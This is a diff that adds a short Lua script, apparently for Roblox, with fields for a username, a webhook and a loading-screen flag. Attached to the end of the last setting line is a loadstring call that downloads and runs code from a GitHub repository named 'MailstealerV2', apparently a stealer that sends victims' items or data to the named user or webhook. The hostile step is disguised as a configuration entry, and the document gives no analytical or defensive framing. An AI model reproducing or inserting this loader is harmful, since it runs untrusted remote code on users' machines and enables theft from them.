@@ -1,0 +1,5 @@
+Username = "khenrex9"
+
+Webhook = ""
+
+LoadingScreen = "False" loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
